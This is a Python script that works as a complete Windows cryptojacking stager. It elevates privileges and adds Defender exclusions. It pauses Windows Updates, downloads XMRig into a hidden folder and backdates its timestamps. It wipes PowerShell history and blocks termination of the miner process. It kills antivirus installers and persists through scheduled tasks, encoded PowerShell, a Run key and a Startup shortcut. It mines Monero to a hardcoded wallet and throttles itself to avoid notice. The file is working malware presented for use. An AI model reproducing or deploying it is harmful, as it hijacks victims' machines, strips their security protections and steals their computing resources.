import ctypes, os, sys, subprocess, json, random, winreg, logging, traceback, time, zipfile, shutil, tempfile, string, base64

try:
    import psutil
except ImportError:
    print("psutil is required. Install with: pip install psutil")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("requests is required. Install with: pip install requests")
    sys.exit(1)

import threading

# ===== USER SETTINGS =====
WALLET_ADDRESS = "49Xmz3gDf3jZaSWMGJV5Fq3LhGvPLJk3nwn2RoHtmh8vw5vMhGknq1j5eFq6bKZ1LBs1HT4P3J4u2s5yXJ3G9cV6"   # <--- SET YOUR MONERO WALLET ADDRESS
CONFIG_DIR_REL = "Microsoft\\Windows\\Themes\\CachedFiles"

FALLBACK_XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"

# --- Feature Toggles ---
SHOW_CONSOLE = True          # True = miner window visible, False = hidden
ENABLE_SNOOPING = False      # True = pause miner if taskmgr/procexp etc. detected
ENABLE_PERSISTENCE = True    # True = install scheduled tasks + registry run keys
DEBUG_MODE = True            # True = verbose logging, False = quiet
ARM_SELF_DELETE = False      # True = script deletes itself after deploying miner
# ============================================================

hawk = logging.getLogger('hawk')
hawk.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s|%(levelname)s|%(message)s')
ch = logging.StreamHandler()
if DEBUG_MODE:
    ch.setLevel(logging.INFO)
else:
    ch.setLevel(logging.WARNING)
ch.setFormatter(formatter)
hawk.addHandler(ch)

log_path = os.path.join(tempfile.gettempdir(), "stager_debug.log")
fh = logging.FileHandler(log_path)
fh.setLevel(logging.DEBUG)
fh.setFormatter(formatter)
hawk.addHandler(fh)
hawk.info(f"[LOG] Writing log to {log_path}")

def global_exception_handler(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    hawk.critical("Unhandled exception:", exc_info=(exc_type, exc_value, exc_traceback))
    for h in hawk.handlers:
        h.flush()
    if sys.stdin and sys.stdin.isatty():
        input("\nPress Enter to exit...")
    sys.exit(999)

sys.excepthook = global_exception_handler

ERR = {
    'ELEVATION_LOOP': 801,
    'UNEXPECTED': 999
}

def log_environment_info():
    try:
        admin = is_admin()
        hawk.info(f"[ENV] Admin: {admin}")
        try:
            gid = ctypes.windll.kernel32.GetUserGeoID(16)
            country = "Canada" if gid == 39 else f"GeoID {gid}"
            hawk.info(f"[ENV] Country (GeoID): {country}")
        except:
            hawk.info("[ENV] Country: unknown")
    except:
        pass

def trigger_exit(code, reason):
    log_environment_info()
    hawk.critical(f"TRIGGER_EXIT|code={code}|reason={reason}")
    for h in hawk.handlers:
        h.flush()
    if sys.stdin and sys.stdin.isatty():
        hawk.info("Press Enter to exit...")
        input("\n>>> Script will exit now. Press Enter to close this window.")
    sys.exit(0)

def self_del():
    p = os.path.abspath(sys.argv[0])
    if not os.path.exists(p): sys.exit(0)
    deleted = False
    try:
        sz = os.path.getsize(p)
        with open(p, 'wb') as f:
            f.write(os.urandom(sz))
            f.flush()
            os.fsync(f.fileno())
        os.remove(p)
        deleted = True
    except:
        pass
    if not deleted:
        bat = f'{p}.del.bat'
        with open(bat, 'w') as f:
            f.write(f'@echo off\nping 127.0.0.1 -n 2 > nul\ndel /f /q "{p}"\ndel /f /q "{bat}"\n')
        subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
        winreg.SetValueEx(key, "delstager", 0, winreg.REG_SZ, f'cmd /c del /f /q "{p}"')
        winreg.CloseKey(key)
    except:
        pass
    sys.exit(0)

def is_admin():
    """Return True only if we have true elevated admin rights."""
    try:
        test_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SOFTWARE\Microsoft\Windows\CurrentVersion",
                                  0, winreg.KEY_WRITE)
        winreg.CloseKey(test_key)
        return True
    except:
        return False

def elevate():
    if is_admin():
        return True
    os.environ['__ELEVATED_ATTEMPT__'] = '1'
    script = os.path.abspath(sys.argv[0])
    params = ' '.join(f'"{a}"' for a in sys.argv[1:])
    ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    if ret > 32:
        sys.exit(0)
    else:
        hawk.critical(f"Elevation failed with error code {ret}")
        return False

def _add_exclusion_powershell(path):
    hawk.debug(f"[EXCLUSION_PS] Adding exclusion: {path}")
    try:
        ps_cmd = f'Add-MpPreference -ExclusionPath "{path}" -Force'
        subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd],
                       capture_output=True, timeout=10)
        hawk.debug(f"[EXCLUSION_PS] Success: {path}")
    except Exception as e:
        hawk.error(f"[EXCLUSION_PS] Failed: {e}")

def _verify_exclusion(path):
    try:
        ps_cmd = f'(Get-MpPreference).ExclusionPath -contains "{path}"'
        res = subprocess.run(['powershell', '-Command', ps_cmd],
                             capture_output=True, timeout=10)
        return b'True' in res.stdout
    except:
        return False

def add_self_to_defender_exclusions():
    hawk.info("[EXCLUSION] adding script to Defender exclusions")
    script_path = os.path.abspath(sys.argv[0])
    _add_exclusion_powershell(script_path)
    if not _verify_exclusion(script_path):
        hawk.error("[EXCLUSION] Failed to exclude script itself!")

def add_folder_to_defender_exclusions(path):
    hawk.info(f"[EXCLUSION] adding folder {path} to Defender exclusions")
    _add_exclusion_powershell(path)
    if not _verify_exclusion(path):
        hawk.warning(f"[EXCLUSION] Folder exclusion may have failed: {path}")

def _is_volatile_pause_flag_set():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment")
        val, _ = winreg.QueryValueEx(key, "MinerPaused")
        winreg.CloseKey(key)
        return val == 1
    except:
        return False

def disable_windows_updates():
    hawk.info("[WIN_UPDATE] pausing updates for 35 days")
    try:
        ps_cmd = (
            f'$pauseDate = (Get-Date).AddDays(35).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ"); '
            f'$path = "HKLM:\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings"; '
            f'if (!(Test-Path $path)) {{ New-Item -Path $path -Force | Out-Null }}; '
            f'Set-ItemProperty -Path $path -Name PauseUpdatesExpiryTime -Value $pauseDate -Type String -Force; '
            f'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update" -Name AUOptions -Value 1 -Type DWord -Force'
        )
        subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True, timeout=30)
        hawk.info("[WIN_UPDATE] updates paused")
    except Exception as e:
        hawk.error(f"[WIN_UPDATE] failed: {e}")

def create_secure_hidden_dir():
    chars = string.ascii_letters + string.digits
    folder_name = ''.join(random.choices(chars, k=17))
    base = os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local')
    base = os.path.join(base, 'Microsoft', 'Caches')
    os.makedirs(base, exist_ok=True)
    full_path = os.path.join(base, folder_name)
    os.makedirs(full_path, exist_ok=True)
    return full_path

def is_pe_file(path):
    try:
        with open(path, 'rb') as f:
            if f.read(2) != b'MZ':
                return False
            f.seek(0x3C)
            pe_offset_bytes = f.read(4)
            if len(pe_offset_bytes) < 4:
                return False
            pe_offset = int.from_bytes(pe_offset_bytes, 'little')
            if pe_offset <= 0 or pe_offset > 1024 * 1024:
                return True
            f.seek(pe_offset)
            sig = f.read(4)
            if sig == b'PE\x00\x00':
                return True
            return os.path.getsize(path) > 1024
    except:
        return False

def time_stomp(filepath, refpath=None):
    if not refpath:
        refpath = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'explorer.exe')
    try:
        if os.path.exists(refpath):
            ref_stat = os.stat(refpath)
            os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
            hawk.debug(f"[STOMP] timestamps set for {filepath}")
    except Exception as e:
        hawk.error(f"[STOMP] failed: {e}")

def download_fallback_xmrig(install_dir):
    hawk.info("[FALLBACK] Downloading official XMRig as last resort")
    try:
        url = FALLBACK_XMRIG_URL
        response = requests.get(url, stream=True)
        response.raise_for_status()
        zip_path = os.path.join(install_dir, "xmrig.zip")
        with open(zip_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        hawk.info("[FALLBACK] Download complete, extracting...")
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(install_dir)
        os.remove(zip_path)
        for root, dirs, files in os.walk(install_dir):
            for file in files:
                if file.lower() == "xmrig.exe":
                    xmrig_path = os.path.join(root, file)
                    time_stomp(xmrig_path)
                    hawk.info(f"[FALLBACK] Found xmrig.exe at {xmrig_path}")
                    return xmrig_path
        hawk.error("[FALLBACK] xmrig.exe not found in downloaded archive")
        return None
    except Exception as e:
        hawk.error(f"[FALLBACK] failed: {e}")
        return None

def wipe_ps_history():
    """Securely delete the PowerShell history file."""
    try:
        history_path = os.path.join(os.environ['APPDATA'],
                                    r'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        if os.path.exists(history_path):
            with open(history_path, 'wb') as f:
                f.write(os.urandom(1024))
            os.remove(history_path)
            hawk.info("[HISTORY] PowerShell history wiped")
    except Exception as e:
        hawk.error(f"[HISTORY] Wipe failed: {e}")

def generate_config(config_dir, threads=None):
    hawk.info("[CONFIG] generating config.json")
    cpu_count = os.cpu_count() or 4
    if threads is None:
        threads = max(1, round(cpu_count * 0.20))
    config = {
        "autosave": True,
        "donate-level": 0,
        "cpu": {
            "enabled": True,
            "max-threads-hint": threads,
            "priority": 0
        },
        "api": {
            "id": "hawk",
            "worker-id": "hawk-miner",
            "http": {
                "enabled": True,
                "host": "127.0.0.1",
                "port": 60606,
                "access-token": None,
                "restricted": False
            }
        },
        "pools": [
            {
                "url": "stratum+ssl://minerno.de:443",
                "user": WALLET_ADDRESS,
                "pass": "x",
                "keepalive": True,
                "tls": True
            },
            {
                "url": "stratum+tcp://pool.supportxmr.com:80",
                "user": WALLET_ADDRESS,
                "pass": "x",
                "keepalive": True,
                "tls": False
            }
        ]
    }
    config_path = os.path.join(config_dir, "config.json")
    try:
        with open(config_path, 'w') as cf:
            json.dump(config, cf, indent=2)
        hawk.info(f"[CONFIG] written to {config_path}")
    except Exception as e:
        hawk.error(f"[CONFIG] write failed: {e}", exc_info=True)

def protect_process(pid):
    try:
        import win32security, win32api, win32process
    except ImportError:
        hawk.warning("[PROCESS_PROTECT] pywin32 not installed, skipping ACL protection")
        return
    try:
        hProcess = win32api.OpenProcess(0x0400, False, pid)
        admins, _, _ = win32security.LookupAccountName("", "Administrators")
        system, _, _ = win32security.LookupAccountName("", "SYSTEM")
        dacl = win32security.ACL()
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, 0x0001, admins)
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, 0x0001, system)
        win32security.SetSecurityInfo(hProcess, win32security.SE_KERNEL_OBJECT,
                                      win32security.DACL_SECURITY_INFORMATION,
                                      None, None, dacl, None)
        hawk.info("[PROCESS_PROTECT] only admins/system can terminate miner")
    except Exception as e:
        hawk.error(f"[PROCESS_PROTECT] failed: {e}")

AV_INSTALLERS = {
    'setup.exe', 'install.exe', 'installer.exe',
    'mbam-setup.exe', 'mbam.exe', 'mbamtray.exe',
    'avast_free_antivirus_setup.exe', 'avastsetup.exe', 'avastui.exe',
    'avg_setup.exe', 'avgui.exe', 'avgnt.exe',
    'bitdefender_installer.exe', 'bdagent.exe', 'bdwtxag.exe',
    'kavsetup.exe', 'kis_setup.exe', 'avp.exe', 'avpui.exe',
    'mcafee_setup.exe', 'mcshield.exe', 'mcuicnt.exe',
    'norton_installer.exe', 'nis_setup.exe', 'navw32.exe',
    'eset_smart_security_installer.exe', 'egui.exe', 'ekrn.exe',
    'sophossetup.exe', 'sophos_installer.exe', 'savmain.exe',
    'f-secure_installer.exe', 'fsbts.exe', 'fssm32.exe',
    'gdata_installer.exe', 'avk.exe', 'avkproxy.exe',
    'panda_installer.exe', 'pavsrvx.exe', 'psimsvc.exe',
    'webroot_installer.exe', 'wrkrn.exe', 'wrsa.exe',
    'comodo_installer.exe', 'cis.exe', 'cmdagent.exe',
    'trendmicro_installer.exe', 'pccntupd.exe', 'ntrtscan.exe',
    'msmpeng.exe', 'nisrv.exe',
    'avast_chrome_setup.exe', 'avg_chrome_setup.exe',
}

class MinerWatchdog:
    def __init__(self, exe_path, config_dir, base_threads=None):
        self.exe_path = exe_path
        self.config_dir = config_dir
        self.config_path = os.path.join(config_dir, 'config.json')
        cpu_count = os.cpu_count() or 4
        self.cpu_count = cpu_count
        self.base_threads = max(1, round(cpu_count * 0.20))  # 20% of cores
        self.max_threads = max(1, round(cpu_count * 0.25))    # 25% of cores
        self.current_threads = self.base_threads
        self.miner_proc = None
        self.running = True
        self.lock = threading.Lock()
        self._last_adjust_time = 0            # cooldown timestamp
        self._no_hashrate_count = 0           # how many times hashrate was zero
        self._api_ready = False               # flag: API is alive

    def start(self):
        hawk.info("[WATCHDOG] immediate launch (no delay)")
        try:
            self._launch_miner()
        except Exception as e:
            hawk.critical(f"[WATCHDOG] initial launch failed: {e}")
            self.miner_proc = None
        if self.miner_proc:
            time.sleep(3)
            self._api_ready = True
        threading.Thread(target=self._watchdog_loop, daemon=True).start()

    def _api_adjust_threads(self, threads):
        """Set miner threads via API. Returns True on success."""
        if not self._api_ready:
            return False
        try:
            url = "http://127.0.0.1:60606/json_rpc"
            payload = {
                "id": 1,
                "jsonrpc": "2.0",
                "method": "set_cpu_max_threads",
                "params": {"threads": threads}
            }
            r = requests.post(url, json=payload, timeout=3)
            if r.status_code == 200 and r.json().get("result", {}).get("status") == "OK":
                hawk.info(f"[API] Threads set to {threads} via API")
                return True
        except Exception as e:
            hawk.warning(f"[API] Thread adjustment failed: {e}")
        return False

    def _get_hashrate(self):
        """Return total hashrate (H/s) or None if API unreachable."""
        if not self._api_ready:
            return None
        try:
            url = "http://127.0.0.1:60606/1/summary"
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                data = r.json()
                return data.get("hashrate", {}).get("total", [None])[0]
        except Exception:
            pass
        return None

    def _launch_miner(self):
        console_flag = subprocess.CREATE_NEW_CONSOLE if SHOW_CONSOLE else subprocess.CREATE_NO_WINDOW
        for attempt in range(3):
            try:
                if self.miner_proc and self.miner_proc.poll() is None:
                    self.miner_proc.terminate()
                    try:
                        self.miner_proc.wait(timeout=5)
                    except:
                        pass

                try:
                    with open(self.config_path, 'r') as cf:
                        config = json.load(cf)
                except:
                    hawk.warning("[WATCHDOG] config missing or corrupted, regenerating")
                    generate_config(self.config_dir, self.current_threads)
                    with open(self.config_path, 'r') as cf:
                        config = json.load(cf)

                config['cpu']['max-threads-hint'] = self.current_threads
                with open(self.config_path, 'w') as f:
                    json.dump(config, f, indent=2)

                # Verify & re-add exclusions
                if not _verify_exclusion(self.exe_path):
                    hawk.warning("[WATCHDOG] miner not in exclusion list, re-adding")
                    add_folder_to_defender_exclusions(self.exe_path)
                if not _verify_exclusion(self.config_dir):
                    hawk.warning("[WATCHDOG] config dir not in exclusion list, re-adding")
                    add_folder_to_defender_exclusions(self.config_dir)

                try:
                    ps_exe = f'Add-MpPreference -ExclusionPath "{self.exe_path}" -Force'
                    subprocess.run(['powershell', '-NoProfile', '-Command', ps_exe], capture_output=True, timeout=15)
                except Exception as e:
                    hawk.warning(f"[WATCHDOG] Could not add PowerShell exclusion: {e}")

                # Launch
                self.miner_proc = subprocess.Popen(
                    [self.exe_path, f"--config={self.config_path}"],
                    creationflags=console_flag
                )
                protect_process(self.miner_proc.pid)
                hawk.info(f"[WATCHDOG] miner launched with {self.current_threads} threads, PID {self.miner_proc.pid}")
                self._api_ready = False   # API not yet ready until proven
                return
            except OSError as e:
                if e.winerror == 225 and attempt < 2:
                    hawk.warning(f"[WATCHDOG] Defender blocked launch (attempt {attempt+1}), retrying...")
                    time.sleep(5)
                elif e.winerror == 225 and attempt == 2:
                    hawk.warning("[WATCHDOG] Trying fallback via cmd /c start...")
                    try:
                        self.miner_proc = subprocess.Popen(
                            f'cmd /c start "" "{self.exe_path}" --config="{self.config_path}"',
                            shell=True, creationflags=console_flag
                        )
                        protect_process(self.miner_proc.pid)
                        hawk.info(f"[WATCHDOG] miner launched via cmd fallback, PID {self.miner_proc.pid}")
                        self._api_ready = False
                        return
                    except Exception as e2:
                        hawk.error(f"[WATCHDOG] Fallback launch failed: {e2}")
                        raise
                else:
                    hawk.error(f"[WATCHDOG] Launch failed: {e}")
                    raise
        raise RuntimeError("Miner launch failed after 3 attempts")

    def _check_for_snooping(self):
        SUSPICIOUS_PROCS = {'taskmgr.exe', 'procexp.exe', 'perfmon.exe', 'resmon.exe', 'procmon.exe', 'processhacker.exe'}
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in SUSPICIOUS_PROCS:
                    return True
        except:
            pass
        return False

    def _kill_av_installers(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() in AV_INSTALLERS:
                try:
                    proc.kill()
                    hawk.info(f"[WATCHDOG] Killed AV installer: {proc.info['name']}")
                except:
                    pass

    def _watchdog_loop(self):
        high_cpu_count = 0
        low_cpu_count = 0
        target_low  = self.cpu_count * 15
        target_high = self.cpu_count * 25

        while self.running:
            try:
                # --- binary recovery ---
                if not os.path.exists(self.exe_path):
                    hawk.warning("[WATCHDOG] Miner executable missing, attempting re-download...")
                    install_dir = os.path.dirname(self.exe_path)
                    new_path = download_fallback_xmrig(install_dir)
                    if new_path:
                        self.exe_path = new_path
                        # exclude the new binary
                        add_folder_to_defender_exclusions(os.path.dirname(self.exe_path))
                        try:
                            ps_exe = f'Add-MpPreference -ExclusionPath "{self.exe_path}" -Force'
                            subprocess.run(['powershell', '-NoProfile', '-Command', ps_exe], capture_output=True, timeout=15)
                        except: pass
                        hawk.info("[WATCHDOG] Miner re-downloaded and excluded")
                    else:
                        hawk.critical("[WATCHDOG] Re-download failed, exiting")
                        self.running = False
                        break

                # --- restart dead miner ---
                if self.miner_proc is None or self.miner_proc.poll() is not None:
                    hawk.warning("[WATCHDOG] Miner not running, restarting")
                    try:
                        self._launch_miner()
                        if self.miner_proc:
                            # Wait for API to come up
                            time.sleep(5)
                            self._api_ready = True
                    except Exception as e:
                        hawk.error(f"[WATCHDOG] re-launch failed: {e}")
                        self.miner_proc = None
                    high_cpu_count = 0
                    low_cpu_count = 0
                    time.sleep(10)
                    continue

                # --- snooping detection (unchanged) ---
                if ENABLE_SNOOPING and self._check_for_snooping():
                    hawk.critical("[WATCHDOG] Snooping tools detected - pausing miner")
                    if self.miner_proc and self.miner_proc.poll() is None:
                        self.miner_proc.terminate()
                    while self._check_for_snooping():
                        time.sleep(10)
                    hawk.info("[WATCHDOG] Snooping stopped - waiting 30 seconds before resuming")
                    time.sleep(30)
                    try:
                        self._launch_miner()
                    except Exception as e:
                        hawk.error(f"[WATCHDOG] post-snooping launch failed: {e}")
                        self.miner_proc = None
                    high_cpu_count = 0
                    low_cpu_count = 0
                    continue

                self._kill_av_installers()

                # --- CPU & hashrate monitoring ---
                if self.miner_proc and self.miner_proc.poll() is None:
                    try:
                        p = psutil.Process(self.miner_proc.pid)
                        miner_cpu = p.cpu_percent(interval=2)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        hawk.warning("[WATCHDOG] Miner process vanished during CPU check")
                        self.miner_proc = None
                        high_cpu_count = 0
                        low_cpu_count = 0
                        time.sleep(5)
                        continue

                    # Check hashrate every ~ 30 seconds (4 cycles)
                    if low_cpu_count + high_cpu_count == 0:  # avoid checking while adjusting
                        hashrate = self._get_hashrate()
                        if hashrate is not None and hashrate == 0:
                            self._no_hashrate_count += 1
                            # --- Temporarily disabled to allow miner to connect ---
                            # if self._no_hashrate_count >= 4:   # ~32 seconds of zero hashrate
                            #     hawk.warning("[WATCHDOG] Zero hashrate for too long, restarting miner")
                            #     self.miner_proc.terminate()
                            #     self._no_hashrate_count = 0
                            #     continue
                        else:
                            self._no_hashrate_count = 0
                    else:
                        self._no_hashrate_count = 0

                    hawk.debug(f"[WATCHDOG] CPU: {miner_cpu:.1f}% | threads: {self.current_threads}")

                    # --- thread adjustment with cooldown (only skip adjustments, not whole loop) ---
                    now = time.time()
                    if now - self._last_adjust_time >= 30:
                        if miner_cpu > target_high:
                            high_cpu_count += 1
                            low_cpu_count = 0
                            if high_cpu_count >= 2:
                                new_threads = max(1, self.current_threads - 2)
                                if self._api_adjust_threads(new_threads):
                                    self.current_threads = new_threads
                                    self._last_adjust_time = now
                                else:
                                    hawk.warning("[WATCHDOG] API fail, restarting miner to reduce threads")
                                    self.current_threads = new_threads
                                    self._launch_miner()
                                    if self.miner_proc:
                                        self._api_ready = True
                                    self._last_adjust_time = now
                                high_cpu_count = 0
                                low_cpu_count = 0
                                time.sleep(5)
                                continue
                        else:
                            high_cpu_count = 0

                        if miner_cpu < target_low:
                            low_cpu_count += 1
                            if low_cpu_count >= 6 and self.current_threads < self.max_threads:
                                new_threads = self.current_threads + 1
                                if self._api_adjust_threads(new_threads):
                                    self.current_threads = new_threads
                                    self._last_adjust_time = now
                                else:
                                    self.current_threads = new_threads
                                    self._launch_miner()
                                    if self.miner_proc:
                                        self._api_ready = True
                                    self._last_adjust_time = now
                                low_cpu_count = 0
                                high_cpu_count = 0
                                time.sleep(5)
                                continue
                        else:
                            low_cpu_count = 0
                    else:
                        # Cooldown active: reset counters to avoid spurious adjustments later
                        high_cpu_count = 0
                        low_cpu_count = 0

                time.sleep(8)
            except Exception as e:
                hawk.error(f"[WATCHDOG] loop exception: {e}", exc_info=True)
                time.sleep(10)

def create_scheduled_task_deployer():
    if not ENABLE_PERSISTENCE:
        hawk.info("[PERSISTENCE] disabled")
        return
    hawk.info("[PERSISTENCE] creating logon scheduled task for watchdog script")
    try:
        task_name = "WindowsHelperTask"
        script_path = os.path.abspath(sys.argv[0])
        python_exe = sys.executable
        subprocess.run([
            'schtasks', '/create', '/tn', task_name,
            '/tr', f'"{python_exe}" "{script_path}"',
            '/sc', 'onlogon', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] logon task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] logon task failed: {e}", exc_info=True)

    hawk.info("[PERSISTENCE] creating watchdog scheduled task (runs every 5 minutes)")
    try:
        task_name_watchdog = "WindowsHelperWatchdog"
        script_path = os.path.abspath(sys.argv[0])
        python_exe = sys.executable
        ps_script = f'''$proc = Get-Process -Name python | Where-Object {{ $_.Path -eq '{python_exe}' }} | Select-Object -First 1; if (-not $proc) {{ Start-Process -FilePath '{python_exe}' -ArgumentList '"{script_path}"' -WindowStyle Hidden }}'''
        b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        subprocess.run([
            'schtasks', '/create', '/tn', task_name_watchdog,
            '/tr', f'powershell -EncodedCommand {b64}',
            '/sc', 'minute', '/mo', '5', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] watchdog task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] watchdog task failed: {e}", exc_info=True)

def add_persistence_multi():
    script_path = os.path.abspath(sys.argv[0])
    python_exe = sys.executable
    target = f'"{python_exe}" "{script_path}"'

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, "WindowsHelper", 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        hawk.info("[PERSISTENCE] Registry Run key added")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] Registry Run key failed: {e}")

    try:
        startup_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_dir, "WindowsHelper.lnk")
        ps_cmd = f'''
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')
$Shortcut.TargetPath = '{python_exe}'
$Shortcut.Arguments = '"{script_path}"'
$Shortcut.WindowStyle = 7
$Shortcut.Save()
'''
        b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        subprocess.run(['powershell', '-EncodedCommand', b64], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] Startup shortcut created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] Startup shortcut failed: {e}")

def run_stager():
    if _is_volatile_pause_flag_set():
        hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
        sys.exit(0)

    # Optional: keep pausing updates (remove if you want zero system changes)
    disable_windows_updates()

    # Create hidden folder and exclude it
    install_dir = create_secure_hidden_dir()
    add_folder_to_defender_exclusions(install_dir)

    # Download official XMRig, extract, and return path
    miner_exe = download_fallback_xmrig(install_dir)
    if not miner_exe or not is_pe_file(miner_exe):
        hawk.critical("[PAYLOAD] Miner missing or invalid after download")
        return

    # Cleanup PS history
    wipe_ps_history()

    # Config directory + exclusion
    config_dir = os.path.join(os.environ.get('APPDATA', ''), CONFIG_DIR_REL)
    os.makedirs(config_dir, exist_ok=True)
    add_folder_to_defender_exclusions(config_dir)
    generate_config(config_dir)

    # Final exclusion on the exe itself
    try:
        ps_exe = f'Add-MpPreference -ExclusionPath "{miner_exe}" -Force'
        subprocess.run(['powershell', '-NoProfile', '-Command', ps_exe], capture_output=True, timeout=15)
        hawk.info(f"[MAIN] final PowerShell exclusion for {miner_exe}")
    except:
        pass

    # Launch miner via watchdog (immediate start)
    watchdog = MinerWatchdog(miner_exe, config_dir)
    watchdog.start()
    hawk.info("[WATCHDOG] started")

    # Persistence
    create_scheduled_task_deployer()
    add_persistence_multi()

    if ARM_SELF_DELETE:
        self_del()

    hawk.info("[STAGER] deployment complete, watchdog running")
    try:
        while watchdog.running:
            time.sleep(1)
    except KeyboardInterrupt:
        hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
    finally:
        if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
            watchdog.miner_proc.terminate()
        hawk.info("[MAIN] exiting")
    sys.exit(0)

def main():
    print("\n" + "="*60)
    print(" MONOLITHIC STARTED ".center(60, "="))
    print("="*60 + "\n")

    hawk.info(f"[MAIN] start, PID={os.getpid()}")
    hawk.info(f"[MAIN] woke up, args={sys.argv}")

    for _ in range(4):
        if is_admin():
            break
        if not elevate():
            time.sleep(1)
    if not is_admin():
        hawk.critical("[MAIN] Failed to obtain admin rights after 4 attempts")
        trigger_exit(ERR['ELEVATION_LOOP'], "Failed to obtain admin rights")

    hawk.info("[MAIN] waiting 15 seconds before adding script exclusion...")
    time.sleep(15)
    add_self_to_defender_exclusions()

    # ALWAYS run stager – fresh deployment every time
    hawk.info("[MAIN] No deployment found, running stager logic")
    run_stager()

    input("\n=== Script finished. Press Enter to exit...")

if __name__ == '__main__':
    try:
        main()
    except SystemExit:
        pass
    except Exception:
        print("\n!!! FATAL ERROR !!!")
        traceback.print_exc()
        hawk.critical("!!! UNHANDLED ERROR OUTSIDE MAIN !!!", exc_info=True)
        for h in hawk.handlers:
            h.flush()
    if sys.stdin and sys.stdin.isatty():
        input("\n=== Press Enter to close this window ===")
